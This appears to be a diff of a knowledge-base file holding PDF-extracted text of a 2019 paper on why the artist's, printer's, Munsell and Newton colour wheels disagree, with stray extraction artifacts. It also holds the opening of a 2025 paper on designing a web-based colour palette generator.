+The first four colour wheels from Figure 7, showing the differences in
+angle between the pairs red-yellow and blue-green, and giving the
+opposite colours to red and blue.
+red- blue- opposite opposite
+Colour wheel yellow green of red of blue
+```
+Opponent (RYGB) 90◦ 90◦ green yellow
+```
+```
+Munsell (RYGBP) 72◦ 72◦ blue-green yellow-red
+```
+```
+Printer’s (RYGCBM) 60◦ 120◦ cyan yellow
+```
+```
+Artist’s (ROYGBP) 120◦ 60◦ green orange
+```
+the “opposite” of a given hue is the hue that is on the
+opposite side of a diameter through the centre of a colour
+wheel. There are at least three other useful definitions of
+opposite [Fry06] [Har06].
+• Additive complementaries: two coloured lights that,
+when mixed, give white.
+• Subtractive complementaries: two pigments that, when
+mixed together, produce a grey. In theory, oppo-
+```
+sites on the artist’s and printer’s colour wheels (Fig-
+```
+```
+ure 7(c) and (d)) should do this.
+```
+• Perceptual complementaries: a colour’s opposite is the
+colour perceived as an afterimage after fixating on
+the first colour for a significant period of time.
+As Harkness shows [Har06], these each give slightly differ-
+ent opposites for any given colour. For example, fixating on
+Itten’s red and then looking away will give a blue-green
+sensation rather than to the green of the artist’s colour
+wheel [Bri07, Sec.11.3]. So the word “opposite” needs to
+be defined carefully in order to give a clear answer to
+our question. This means that we should not expect the
+Munsell or opponent-colour wheels to have the same colour
+diametrically opposite blue as do the printer’s or artist’s
+colour wheels, because the Munsell and opponent-colour
+colour spaces were not designed using criteria by which op-
+posite colours necessarily represent complementary colours.
+Indeed, these colour spaces are non-linear spaces and there-
+fore attempts to use them for accurate colour mixing will
+fail.
+However, we would expect the printer’s and artist’s
+colour wheels to have the same diagonally-opposed colours,
+because they are both constructed by the same principle
+of subtractive complementarity. We find that they do not:
+the diagonal opposite of blue is yellow in the printer’s
+colour wheel and orange in the artist’s. As the definition
+of “opposite” is the same in these two wheels, we must
+consider the definition of “blue”.
+5.2 What is meant by “blue”?
+When asked to imagine a blue, the average person will
+choose a colour close to the “best, most-typical example”
+at 10B/4.5. But when asked if a particular colour is “blue”,
+the answer is “yes” for a range from cyan through to indigo
+```
+(Figure 6). “Blue” can refer to any spectral colour from about
+```
+```
+490nm (a greenish-blue, cyan) to 450nm (a purplish-blue,
+```
+```
+indigo). What we mean by “blue” changes the answers to
+```
+questions about that colour. As Itten says, “unless our color
+names correspond to precise ideas, no useful discussion of
+color is possible” [Itt70, p.30].
+yellow
+primary
+magenta
+primary
+cyan
+primary
+green
+secondary
+red
+secondary
+blue
+secondary
+Fig. 8. Mixing real primary inks to produce the three secondaries.
+Inner ring: primary colour toners mixed on a colour laser printer [Fuji
+Xerox FX ApeosPort-IV C3375 v3018.103 PS]. Outer ring: primary fluid
+acrylic paints mixed with a paintbrush [paints from Golden Artist Col-
+```
+ors, Inc: Primary Cyan (pigments PW6/PB15:4/Titanium White/Phthalo
+```
+```
+Blue(GS)), Primary Magenta (pigment PV19/Quinacridone), Primary
+```
+```
+Yellow (pigments PY3/PY73/PW6/Hansa Yellow Light/Hansa Yellow
+```
+```
+Medium/Titanium White)].
+```
+The answer to “what is the opposite of blue?” depends
+both on what you mean by “opposite” and on what you
+mean by “blue”. Some of the differences in the “opposite
+of blue” column in Table 1 are owing to differences in the
+meaning of “opposite” and some are explained by the word
+“blue” refering to different hues in the different cases.
+5.3 Imprecision in colour naming
+More generally than blue, we find that the colour names
+are imprecise in several cases in our various colour wheels,
+where the actual principal colour used in the colour system
+does not match the “best most-typical” example of that
+colour name. If we consider the colours by how they actu-
+ally appear, rather than by their basic colour names, we find
+that it is possible to reconcile a great deal of the apparent
+differences between the wheels.
+Consider the colour wheels in light of the linguistic
+ambiguity inherent in the colour names and in terms of the
+true appearance of each colour. In Figure 7, we assumed,
+as a student might, that each colour represented the “best,
+most-typical example” of that colour, marked by the crosses
+in Figure 5. Figure 9 redraws those diagrams to reflect the
+actual colour that is represented by each of the general
+colour terms. We consider each wheel in turn.
+```
+5.4 Opponent systems (CIELAB and NCS), RYGB
+```
+```
+In the standard CIELAB system (Figure 9(a)), yellow and
+```
+blue match their best, most-typical examples, but red and
+```
+green do not. CIELAB red is a purplish-red; CIELAB green
+```
+is a cyanish-green [Har06].
+```
+By contrast, in the Natural Colour System (NCS), the
+```
+four principal colours all do match their best, most-typical
+```
+examples (Figure 9(f)) because NCS is defined explicitly in
+```
+terms of the colours that an observer would consider to be
+“pure” red, yellow, green and blue [HST96, p.181] [NCS18].
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 9
+P
+Y
+RcG
+cB
+B
+Y
+R
+G
+B
+Y
+pRcG
+B
+Y
+RG
+B
+Y
+R
+G
+B
+Y
+RG
+RP
+Y
+pB
+oR
+C
+B
+Y
+R
+G
+G
+P
+O
+B
+R
+G
+B
+Y
+R
+G Y
+rP
+O
+B
+RG
+C
+B
+Y
+R
+G Y
+```
+(a) (b)
+```
+```
+(c) (d)
+```
+```
+(e) (f )
+```
+```
+Fig. 9. The colour wheels of Figure 7(a)–(d) and Figure 11(b) redrawn
+```
+to reflect the actual colour represented by each of the principal colour
+names. An uppercase letter represents the same colour as in Figure 7, a
+lowercase letter indicates a colour modifier, with “-ish” added to the end
+```
+of the colour name; for example, oR is “orangish-red”. Inside each wheel
+```
+are labels for the actual colours represented by each coloured disc.
+Outside each wheel are the approximate locations of the best, most-
+typical examples of Red, Yellow, Green, Blue. The thick arc indicates
+the green-blue angle. The thick dotted arc indicates the red-yellow angle.
+```
+The six colour wheels are: (a) CIELAB, one variant of RYGB; (b) Mun-
+```
+```
+sell’s RYGBP; (c) the printer’s colour wheel, RYGCBM; (d) the artist’s
+```
+```
+colour wheel, ROYGBP; (e) Newton’s ROYGCBV where we have used
+```
+the correct angles from Figure 10 and applied the colour corrections
+```
+discussed in the Appendix; (f) NCS, a second variant of RYGB in which
+```
+the colour names match their best, most-typical examples of that colour.
+5.5 Munsell, RYGBP
+Both the principal green and the principal blue have a
+```
+cyanish cast to them (Figure 9(b)), so true green and true
+```
+blue are closer to yellow and purple respectively.
+5.6 Printer’s, RYGCBM
+```
+To assess the printer’s colour wheel (Figure 9(c)), consider
+```
+the colours in Figure 8. This shows two different exam-
+ple sets of CMY inks mixed to make two sets of RGB
+secondaries. Note the consistency between the two sets of
+secondaries. Here “green” is close to the “best, most-typical”
+green, but “red” is an orangish-red, rather than the “best,
+most-typical example” of a red, and “blue” is far removed
+from “best most-typical”, being a deep purplish-blue: an
+indigo. So, although these secondaries are informally called
+“red” and “blue”, they are not sitting at the positions in
+colour space that the average observer would call the “best
+most-typical example” of those colour names.
+5.7 Artist’s, ROYGBP
+Following Itten [Itt70], the artist’s principal colours match
+their “best, most-typical” examples, by definition, because,
+in the absence of any other concept, the student will use
+their internal linguistic definition of the colour to ensure
+that their red is neither shading towards yellow nor shading
+```
+towards blue, and likewise for all the other colours (see
+```
+```
+Section 6).
+```
+5.8 Discussion
+Consider the six revised wheels of Figure 9. Here, I have
+indicated the actual hue of each of the principal colours and
+indicated an approximate location for the “best most-typical
+examples” of yellow, red, blue and green. In particular,
+compare the approximate locations of those four colours
+between the six wheels and compare the lengths of the
+arcs between red and yellow and between green and blue,
+though recall that CIELAB, Munsell, Newton and NCS are
+not metric spaces and so the angles subtended by these arcs
+give only an approximate indication of the actual distance
+between two colours.
+```
+We find that CIELAB (Figure 9(a)), Munsell (Figure 9(b)),
+```
+```
+and the printer’s colour wheel (Figure 9(c)) are now all
+```
+very similar. Our linguistic adjustments push all three of
+these colour spaces close enough to one another that we
+can see that they are describing much the same thing.
+```
+Newton’s ROYGCBV (Figure 9(e) and Appendix) is a little
+```
+distorted, with a larger red-yellow angle than those three
+colour wheels, emphasising the role of orange, but this was
+an early attempt at a colour system so we can accept it as a
+rough approximation. We include it because of its continu-
+ing influence on children’s education about colour. The NCS
+```
+opponent colour system (Figure 9(f)) is distorted further, but
+```
+it is designed for colour specification not for colour mixing
+and it is known to be perceptually uneven: there are more
+visually distinct hues between red and blue than between
+yellow and green [Fai05, p.100]. The outlier is the artist’s
+```
+colour wheel (Figure 9(d)) where the red-yellow section is
+```
+clearly expanded and the blue-green section compressed
+compared with all the other wheels.
+6 WHY IS THE ARTIST’S WHEEL DIFFERENT?
+In theory, the artist’s RYB and the printer’s CMY colour
+wheels should be identical. Both purport to have primaries
+that cannot be made by mixing other colours. Both purport
+to be able to create all hues from the three primaries.
+Both purport to have diametrically-opposite colours that
+mix to make grey. However, the CMY colour wheel is
+demonstrably the correct way to do this, given that these are
+the colours used in the vast majority of commercial colour
+printing processes. The underlying theory is that each of
+the primaries theoretically absorbs exactly one third of the
+visual spectrum. Berns [Ber81, Ch.6], for example, suggests
+splitting the spectrum into thirds at 500 nm and 600 nm.
+A theoretical cyan ink absorbs all red and orange light.
+A theoretical magenta ink absorbs all yellow and green
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 10
+light. A theoretical yellow ink absorbs all blue and violet
+light. Combinations of these three primaries can produce
+any hue. In practice, the spectra of the three inks are not
+perfect squares [Ber81, pp.154–5] [Kip01, Figs.1.4-20,-22], so
+the range of colours achievable is not as broad as would
+be possible with perfect theoretical primaries, but we can
+manufacture inks of sufficient quality to satisfy the vast
+majority of our printing needs.
+The dramatic difference between the theoretically-correct
+CMY colour wheel and the artist’s RYB colour wheel can
+be explained by considering the mechanism by which the
+artist’s colours are chosen. In Itten’s seminal writing on the
+colour wheel [Itt70], he writes: “. . . a person with normal
+```
+vision can identify a red that is neither bluish, nor yellowish;
+```
+```
+a yellow that is neither greenish, nor reddish; and a blue that
+```
+is neither greenish, nor reddish. . . The primary colors must
+be defined with the greatest possible accuracy.” There is no
+freedom here to allow red to be magenta, because magenta
+is a red that is distinctly bluish, nor is there freedom to
+allow blue to be cyan, because cyan is a blue that is dis-
+tinctly greenish. I hypothesise that Itten is placing his three
+primaries at or near the “best, most-typical locations” in the
+Berlin-Kay sense. Itten then mixes his secondaries, which are
+all also Berlin-Kay basic colour terms. So while Itten says
+that his hues are “. . . evenly spaced with complementary
+colours diametrically opposite each other, ” his even spacing
+is in a linguistic sense rather than a physical one.
+Note also how Itten defines his red, yellow and blue.
+Red is “neither bluish, nor yellowish”, defined relative to
+the other two primaries. But yellow and blue are “neither
+```
+greenish, nor reddish” (emphasis mine), so Itten’s three pri-
+```
+maries are defined relative to the four principal colours of
+opponent-colour theory [Bri07, Sec.11.3]. The NCS colour
+system defines its principal colours in exactly the same
+way [HST96, p.181], but uses this defining mechanism to
+create four principal colours rather than the three primary
+```
+colours of the artist’s colour wheel (Figure 9(f) cf. 9(d)).
+```
+By having red and yellow as primaries in the artist’s
+colour wheel, orange becomes a natural secondary and,
+because it is a basic colour term, it is possible to mix
+orange so that, to the artist’s eye, it is neither too reddish
+or too yellowish, thereby occupying its “best most-typical”
+position in colour space. With blue in the third of the
+primary positions, it is obvious from the English Berlin
+```
+and Kay chart (Figure 5) that the other two secondaries
+```
+are going to be green and purple, if we wish them to also
+be basic colour terms. As with orange, it is possible to
+mix these, as Itten says we should, so that they are well-
+balanced and not leaning towards the colour on either side,
+which I hypothesise places them at the “best most-typical”
+positions.
+The substantial difference between the artist’s colour
+wheel and the other colour wheels would not be a problem
+if the artist’s colour wheel, as designed by Itten, were not so
+pervasive in education about colour.
+The challenge with creating the artist’s colour wheel
+is that Itten had two aims that cannot be satisfied simul-
+```
+taneously: he wants his diametrically-opposed colours to
+```
+be perfect subtractive complementaries [Itt70, p.20] and he
+wants his primary and secondary colours to be mixed “very
+carefully” so that, perceptually, they do not “lean towards”
+either colour on either side [Itt70, p.29]. The former is
+```
+achieved correctly by the printer’s colour wheel; the latter
+```
+pushes the primary and secondary colours to their “best,
+most-typical locations” in perceived colour space. The fact
+that the printer’s colour wheel and the artist’s colour wheel
+are substantially different demonstrates that these two aims
+cannot both be satisfied in the same colour wheel1.
+The artist’s RYB is thus an approximation to CMY, yet the
+artist’s colour wheel remains by far the most popular colour
+wheel, outside the technical sphere. This, in spite of the fact
+that the printer’s wheel is technically superior for mixing
+the widest possible range of colours. We must ask why it is
+that a colour wheel that appears technically inferior should
+be so tenaciously held. I hypothesise that the artist’s colour
+wheel’s success is owing to its use of the six basic colour
+terms that correspond to spectral colours: if you are teaching
+colour theory to children, you will gravitate towards using
+the colour names with which they are most familiar.
+One of the challenges in teaching technical printing is
+to explain to the student the special role of magenta and
+cyan, and to describe what they are in terms of the basic
+```
+colour terms (“reddish-pink” and “greenish-blue” respec-
+```
+```
+tively). For example, Gleeson, in her text on the illustration
+```
+of picture books, identifies magenta with red and cyan with
+blue [Gle03, p.53], while Cianciolo, writing on the same
+topic, twice mentions the four process colours, naming them
+as red, yellow, blue and black [Cia76, pp.61,88]. This is not
+necessarily a misunderstanding on the author’s part but
+```
+a need to explain the technical concepts (“magenta” and
+```
+```
+“cyan”) in language that is accessible to the general reader
+```
+```
+(“red” and “blue”).
+```
+As a framework for teaching colour, RYB does admit
+the possibility of using colours other than the “best most-
+typical” and artists over the centuries have used a range
+of different reds, yellows, and blues as their primaries.
+However magenta is outside the red zone in the Berlin
+and Kay diagrams. I hypothesise that the untrained ob-
+server has a challenge with accepting magenta as a primary,
+because it is not intuitively satisfying. Though magenta
+is the correct colour for printing, it does not fall at one
+of the optimal points in Berlin and Kay’s diagram, being
+somewhere between red, pink, and purple. Red is much
+more satisfying, being one of the key colours in Hering’s
+theory of perception. Yellow, by contrast, is both a primary
+and an optimal point in linguistic colour space, so we have
+no trouble accepting it. Cyan is a blue but it is not the most
+typical blue.
+There is a further gloss on the use of RYB. Despite it
+being taught to children as a way of “mixing colours”, it
+would be extremely unusual for a professional artist to have
+just three colours on their palette. Rather, the artist’s colour
+wheel is used as a framework within which to understand
+colour relationships. This is because it is not possible to
+```
+achieve all colours by mixing just a red, yellow and blue;
+```
+and because having a pure hue allows for consistency of
+colour not achievable in repeated mixings. For example,
+Matisse used a palette of 17 colours, van Gogh 9 colours, and
+1. It is possible to create narrowband pigments for opposing colours
+in Itten’s scheme, so that the opposing colours mix to grey, but broad-
+band pigments for the primaries do not allow coverage of as large a
+gamut as CMY.
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 11
+Fryer shows an example of his own work with a palette of
+14 colours [Fry06, p.419]. And, while the colour harmonies
+of Figure 2 are widely taught, any professional artist or
+designer will use their own judgment of harmony rather
+than slavishly depend on this basic framework. Indeed, Itten
+himself says that different students find different combina-
+tions harmonious so that there cannot be a general principle
+that appeals to all [Itt70, p.23].
+7 CONCLUSION
+Some of the apparent difference between the colour wheels
+can be explained linguistically. The most obvious example
+is that we recognise that “blue” has a broad spectrum
+of meanings and that the “best, most-typical” blue is an
+imprecise approximation to the true colour represented by
+the word. In the printer’s colour space, “blue” is an indigo,
+in Munsell’s colour space it is tending to cyan, in the NCS
+and artist’s colour spaces it is sitting at the “best most-
+typical” position, and in the traditional rainbow, ROYGBIV,
+it transpires that “blue” was originally used by Newton to
+mean “cyan”. But all of these are described informally by the
+single term “blue”. Likewise “red” and ”green” are used in
+some colour spaces to refer to colours that are not the “best
+most-typical” example of the colour.
+What can educators conclude from this? Using
+commonly-understood terms, like “opposite” or “blue”, to
+also have a specific technical meaning leads to problems,
+unless one is careful to define those terms to have precise
+meaning. When educating students about colour, we need to
+be careful to be precise in what we mean when we use terms
+like “blue”. In the printing industry, we already have this
+precision when talking about the CMY space, because cyan
+and magenta are not basic colour terms, so our students
+understand them to have precise meanings, and yellow is a
+precise term in common usage, because it occupies such a
+```
+small part of the overall colour space (Figure 5). But terms
+```
+like red, green, blue and purple all have imprecise meaning
+in English and we must be careful to ensure that we are
+defining them appropriately.
+There is a remaining challenge, which is that the artist’s
+colour wheel is at such odds with all of the other colour
+wheels and yet is the first colour system that most people
+will meet. I hypothesise that one reason for its tenacity is
+that it is a convenient approximation that allows educators
+to use six of the basic English colour terms in explaining
+how colour works.
+APPENDIX
+NEWTON’S COLOUR WHEEL
+Newton’s seven-colour rainbow is pervasive in English-
+language education but it is based on shaky foundations.
+Newton performed some of the earliest scientific work on
+understanding colour. He had access to some of the earliest
+optical components that were of good quality and demon-
+strated that a prism split white sunlight into a spectrum
+of colours. In Newton’s earliest work on this, he names
+five colours of the spectrum: red, yellow, green, blue and
+violet [Sha94]. In his later work he augments this to seven
+```
+colours adding orange (a relatively new word in English)
+```
+```
+Fig. 10. Newton’s colour wheel (adapted from [New04, Book I, Part II,
+```
+```
+Plate III, Fig. 11]). Notice that orange and indigo have segments of
+```
+only 30◦ compared to the 60◦ allocated to the five other colours. The
+uppercase letters A − G are intended to correspond to the notes of
+the musical scale, with orange and indigo corresponding to semi-tone
+intervals. The lowercase letters p − x are at the centres of the seven
+```
+colour arcs. Notice the blue (t) is directly opposite the boundary (E)
+```
+between red and orange.
+```
+and indigo (which was a recently discovered, imported
+```
+```
+dyestuff). The addition of these two colours appears to have
+```
+been driven by his desire to get the spectrum to agree with
+the notes of the musical scale [New04, p.114]. Goethe cri-
+tiques Newton for adding orange and indigo and criticises
+his musical analogy as an attempt to impose on the colours
+a mathematical order they do not in fact have [Rib85].
+To get from a linear spectrum to a circular colour wheel
+“Newton also notes that purples could be created by com-
+bining light from the two ends of the spectrum. . . ” [Wal02,
+p.193] so allowing us to join up the two ends into a cir-
+cle [Sha94, p.620]. Looking at Newton’s own drawings of
+```
+his colour wheel (Figure 10), we see an oddity: in order to
+```
+match the tones and semi-tones of a musical scale, Newton
+gives the new colours, orange and indigo, only half as much
+space on the wheel as the original five colours. If we take his
+colour wheel at face value, we see that the opposite of blue is
+the boundary between red and orange. This is significantly
+different from any of the modern understandings, where the
+opposite of blue lies between orange and yellow.
+With regard to his use of the colour indigo, “a careful
+reading of Newton’s work indicates that the color that he
+```
+called indigo, we would normally call blue; his blue is then
+```
+what we would name blue-green or cyan” [Wal02, p.193].
+Finlay points out that, in the eighteenth century, indigo
+referred to a much wider range of colours than it does
+today [Fin07, p.340], generated by different concentrations
+of indigo dye. Taking into account both this information
+about the meanings of words and also the non-uniform
+spacing of colours means that a na¨ıve version of Newton’s
+```
+colour wheel (Figure 11(a)) is incorrect and what he meant is
+```
+```
+much better represented by Figure 11(b), where we replace
+```
+Newton’s “blue” by “cyan” and his “indigo” by our modern
+“blue”. We now find that the opposite of blue is orange-
+yellow.
+How much easier would our explanation of the rainbow
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 12
+```
+(a) (b) R
+```
+C
+V O
+Y
+G
+B
+R
+I
+V O
+Y
+GB
+```
+Fig. 11. Two representations of Newton’s colour wheel. (a) The wheel as
+```
+it would be generated from a na¨ıve literal reading of the colour names
+```
+and from equal spacing around the wheel. (b) The wheel when we take
+```
+into account that Newton’s “indigo” is a modern blue, his “blue” is cyan
+```
+and his spacing around the wheel is non-uniform (Figure 10).
+```
+be if Newton had chosen to stick with his original five
+colours, or had chosen to introduce cyan as his seventh
+colour instead of indigo? We may even have been on the
+way to having a twelfth basic colour term adopted into
+English, as does Russian. Russian does have seven basic
+colour terms in its rainbow [Par05]. As it is, indigo is a
+constant source of confusion in teaching colour in English:
+children are taught that indigo is a fundamental colour in
+the rainbow, but most people do not distinguish it as a
+separate colour. The artist’s colour wheel discards it with-
+out hesitation: the seven colour ROYGBIV becomes the six
+colour ROYGBP.
+ACKNOWLEDGEMENTS
+Thanks to the anonymous reviewers for their careful read-
+ing of the manuscript and for their substantial input that
+considerably improved the quality of this final version.
+REFERENCES
+[Alb66] Leon Battista Alberti. On Painting. Yale University Press,
+second edition, 1966. A translation, with introduction
+and notes, by J. R. Spencer of the Latin De Pictura, first
+published 1435.
+[ATF86] Gail Rex Andrick and Helen Tager-Flusberg. The acquisi-
+```
+tion of colour terms. Journal of Child Language, 13(1):119–
+```
+134, 1986.
+[Ber81] Roy S. Berns. Billmeyer and Saltzman’s Principles of Color
+Technology. Wiley, third edition, 1981.
+[BK69] Brent Berlin and Paul Kay. Basic Color Terms: Their Univer-
+sality and Evolution. Univ of California Press, 1969.
+[Ble12] Steven Bleicher. Contemporary Color: Theory and Use. Cen-
+gage Learning, second edition, 2012.
+[Boy64] Robert Boyle. Experiments and Considerations Touching
+Colours. Henry Herringman, 1664.
+[Bri07] David J. C. Briggs. The Dimensions of Colour: modern
+colour theory for traditional and digital painting me-
+dia, 2007. http://www.huevaluechroma.com/, visited on
+2018–12–24.
+[Cia76] Patricia J Cianciolo. Illustrations in Children’s Books. Wm.
+C. Brown Company Publishers, second edition, 1976.
+[Der91] G. Derefeldt. Colour appearance systems. In P. Gouras,
+editor, The Perception of Colour, pages 218–261. Macmillan,
+Basingstoke, 1991.
+[Fai05] Mark D Fairchild. Color Appearance Models. Wiley, 2005.
+[Fin07] Victoria Finlay. Color: A Natural History of the Palette.
+Random House, 2007.
+[Fry06] Michael J. Fryer. Complementarity. Optics & Laser Technol-
+```
+ogy, 38(4):417–430, 2006.
+```
+[FvDFH90] James D. Foley, Andries van Dam, Steven K. Feiner, and
+John F. Hughes. Computer Graphics: Principles and Practice.
+Addison-Wesley, second edition, 1990.
+[Gei80] Lazarus Geiger. Contributions to the History of the Develop-
+ment of the Human Race. Tr ¨ubner & Company, 1880.
+[Gle03] Libby Gleeson. Making Picture Books. Scholastic Press,
+Gosford, NSW, Australia, 2003.
+[Gou91] P. Gouras. Cortical mechanisms of colour vision. In
+P. Gouras, editor, The Perception of Colour, pages 179–197.
+Macmillan, Basingstoke, 1991.
+[Har98] Clyde L Hardin. Basic color terms and basic color cat-
+egories. In Werner G. K. Backhaus, Werner Backhaus,
+Reinhold Kliegl, and John Simon Werner, editors, Color
+```
+Vision: Perspectives from Different Disciplines, chapter 11,
+```
+pages 207–217. Walter de Gruyter, 1998.
+[Har05] Clyde L Hardin. Explaining basic color categories. Cross-
+```
+Cultural Research, 39(1):72–87, 2005.
+```
+[Har06] Nick Harkness. The colour wheels of art, perception, sci-
+```
+ence and physiology. Optics & Laser Technology, 38(4):219–
+```
+229, 2006.
+[HJ57] Leo M Hurvich and Dorothea Jameson. An opponent-
+```
+process theory of color vision. Psychological Review, 64(6,
+```
+```
+pt. 1):384–404, 1957.
+```
+[HST96] Anders H˚ard, Lars Sivik, and Gunnar Tonnquist. NCS,
+Natural Color System—from concept to research and ap-
+```
+plications. Part I. Color Research & Application, 21(3):180–
+```
+205, 1996.
+[Hun75] Richard S. Hunter. The Measurement of Appearance. Wiley,
+1975.
+[Itt70] Johannes Itten. The Elements of Color. Van Nostrand
+Reinhold, New York, 1970.
+[JMF94] Richard Jackson, Lindsay MacDonald, and Ken Freeman.
+Computer Generated Color: A Practical Guide to Presentation
+and Display. Wiley, 1994.
+[Jon13] William Jervis Jones. German Colour Terms: a study in their
+historical evolution from earliest times to the present. John
+Benjamins Publishing, 2013.
+[KB96] Peter K Kaiser and Robert M Boynton. Human Color Vision.
+Optical Society of America, 1996.
+[Kip01] Helmut Kipphan, editor. Handbook of Print Media: Technolo-
+gies and Production Methods. Springer, 2001.
+[KS08] Rolf G Kuehni and Andreas Schwarz. Color ordered: a
+survey of color systems from antiquity to the present. Oxford
+University Press, 2008.
+[Mun76] Munsell Color. Munsell Book of Color. Munsell Color
+Company, Baltimore, 1976.
+[Mun18] Munsell Color. Munsell Color website, 2018.
+```
+http://www.munsell.com/, visited on 2018–12–24.
+```
+[NCS18] NCS Colour AB. NCS Colour website, 2018.
+```
+http://www.ncscolour.com/, visited on 2018–12–24.
+```
+[New04] Isaac Newton. Opticks: or, a Treatise of the Reflexions, Refrac-
+tions, Inflexions and Colours of Light. Royal Society, 1704.
+[Par05] Galina V Paramei. Singing the Russian blues: An argument
+for culturally basic color terms. Cross-cultural research,
+```
+39(1):10–38, 2005.
+```
+[PF82] Charles Parkhurst and Robert L Feller. Who invented the
+```
+color wheel? Color Research & Application, 7(3):217–230,
+```
+1982.
+[Pla06] Jim Platts. Newton, Goethe and the process of perception:
+```
+an approach to design. Optics & Laser Technology, 38(4):205–
+```
+209, 2006.
+[RDD00] Debi Roberson, Ian Davies, and Jules Davidoff. Color
+categories are not universal: replications and new evidence
+from a stone-age culture. Journal of Experimental Psychology:
+```
+General, 129(3):369–398, 2000.
+```
+[RH72] Eleanor Rosch Heider. Universals in color naming and
+```
+memory. Journal of Experimental Psychology, 93(1):10–20,
+```
+1972.
+[Rib85] Neil M Ribe. Goethe’s critique of Newton: A reconsider-
+ation. Studies in History and Philosophy of Science Part A,
+```
+16(4):315–335, 1985.
+```
+[SAM09] Peter Shirley, Michael Ashikhmin, and Steve Marschner.
+Fundamentals of Computer Graphics. AK Peters, third edi-
+tion, 2009.
+[Sha94] Alan E Shapiro. Artists’ colors and Newton’s colors. Isis,
+```
+85(4):600–630, 1994.
+```
+[Sto03] Maureen Stone. A Field Guide to Digital Color. AK Peters,
+2003.
+[Swe89] Swedish Standard. Swedish Standard SS 01 91 02 Colour
+```
+Atlas. Swedish Standards Institution (SIS), Stockholm,
+```
+second edition, 1989.
+JOURNAL OF PERCEPTUAL IMAGING, VOL. 2, NO. 1, JAN–JUN 2019 13
+[Wal02] Gary Waldman. Introduction to Light: The Physics of Light,
+Vision, and Color. Dover, 2002.
+[WWF+07] Jonathan Winawer, Nathan Witthoft, Michael C. Frank,
+Lisa Wu, Alex R. Wade, and Lera Boroditsky. Russian
+blues reveal effects of language on color discrimination.
+```
+Proceedings of the National Academy of Sciences, 104(19):7780–
+```
+7785, 2007.
 
 ---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd, vcs, api]
 
-## 🔗 File yang Dimodifikasi
+### 📘 KNOWLEDGE: NEXUS_596-ARTICLE TEXT-4777-5556-10-20250717.MD
 
-| File                           | Perubahan                                                                                            |
-| :----------------------------- | :--------------------------------------------------------------------------------------------------- |
-| `agent/core/SemanticEngine.js` | **BARU** — TF-IDF vector engine                                                                      |
-| `agent/core/NexusEngine.js`    | Import SemanticEngine, replace `searchKnowledge()`                                                   |
-| `agent/core/Distiller.js`      | Import SemanticEngine, replace `identifyCategory()`, update `applySemanticTagging()`, update `run()` |
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+
+paperASIA 41 (4b):  2025   62
+COMPENDIUM by paperASIA
+From Empathize to Prototype: A Design
+Thinking Approach in Developing a Web-
+based Color Palette Generator
+## Wirania Swasty
+## 1
+## *, Rilis Tri Akista1, Sri Soedewi
+## 2
+## , Arry Mustikawan
+## 2
+## , Muhammad Ahsanul Mukmin
+## 3
+## , Muhammad
+## Akbar Hafidzan
+## 4
+## 1
+Master of Design, School of Creative Industries, Telkom University, Main Campus (Bandung Campus), Jl.
+Telekomunikasi no.1, Bandung 40257, West Java, Indonesia
+## 2
+Visual Communication Design Study Program, School of Creative Industries, Telkom University, Main Campus
+(Bandung Campus), Jl. Telekomunikasi no.1, Bandung 40257, West Java, Indonesia
+## 3
+Directorate of Digital Business & Technology, PT Telkom Indonesia, Jl. Kebon Sirih 12, Central Jakarta, Indonesia,
+## 10110, Indonesia
+## 4
+Creative Division, SALT Indonesia, Jl. Perjuangan Raya A1-A3, West Jakarta, 11530, Indonesia
+*Corresponding author : wirania@telkomuniversity.ac.id
+## ABSTRACT
+Amateur designers often struggle to find suitable and appealing color palettes for packaging design, especially
+with limited access to local languages. Therefore, this research was planned to design an online color palette
+generator prototype. A web-based color palette generator (CPG) application allows users to quickly create color
+schemes. The research employed a design thinking approach. Emphasizing user engagement through surveys to
+35 respondents, followed by an interview with five participants for usability testing and nine participants for the
+Emotional Journey Map study. It progresses to define user problems and needs, utilizing tools such as User Journey
+Maps, Empathy Maps, and User Personas. Ideation involves brainstorming and affinity diagram techniques, followed
+by a priority matrix and RICE framework. The study culminates in a web-based CPG prototype developed with a
+Mobile-First Approach, utilizing Low-Fidelity and High-Fidelity Wireframes for effective digital product development.
+This study defines an ideal product proposition for users, emphasizing a free color palette generator application
+to expedite color determination and empower product owners in business growth. Prioritizing features based on
+influence and ease of implementation, the key focuses include color decision-making, poster color guidelines, and
+the color palette generator. The second tier encompasses step-by-step tutorials, image pickers, color education,
+and color trends. The third tier involves color search by keywords and a contrast checker. Prototyping, a crucial
+digital product development method, utilizes a mobile-first approach for efficient interface design aligned with user
+requirements from the empathize and define stages. The research recognizes difficulties encountered in choosing
+color palettes. Limited to a web-based prototype, the study suggests further research for usability testing and
+heuristic evaluation to enhance the visual appeal and user experience, ensuring the effectiveness of the CPG.
+KEYWORDS: Color palette, Design thinking, Prototype, User experience, Website
+## Received 24 May 2024; Revised 13 June 2025; Accepted 3 July 2025
+Doi: https://doi.org/10.59953/paperasia.v41i4b.596
+## 1. INTRODUCTION
+The world is overflowing with color combinations,
+which  presents  a  challenge  in  selecting  colors  for
+graphic design, such as promotional media, signage,
+and packaging design. According to Wahyudi et al.
+(2023), the crucial aspect of color in packaging is
+not mere vibrancy but rather its alignment with the
+product. Considering these challenges, this study aims
+to create an online color palette generator prototype
+using the design thinking approach. The design thinking
+approach has been well demonstrated by previous
+research (Bartlett et al., 2021; Lawrence et al., 2022;
+Puebla et al., 2022; Ranti & Lee, 2023).
+The web-based color palette generator application
+aims to enable amateur designers to create color
+schemes primarily for their designs swiftly. Notably,
+the application will be available in Bahasa Indonesia,
+setting it apart from the predominantly English-
+language, general-purpose color palette generators
+available online (Muzli Color, n.d.; MyColorSpaces, n.d.;
+Palette Generator, n.d.) This proposed color palette
+generator focuses specifically on packaging design,
+targeting local users and enhancing their understanding
+using the Indonesian language.
+
+63  paperASIA 41 (4b):  2025
+COMPENDIUM by paperASIA
+From the background overview, the following problem
+statement arises: amateur designers face challenges
+in discovering appealing color palette ideas for their
+packaging designs. This leads to the research question:
+How to design a web-based color palette generator
+prototype using a design thinking approach?
+This research aims to design a web-based color palette
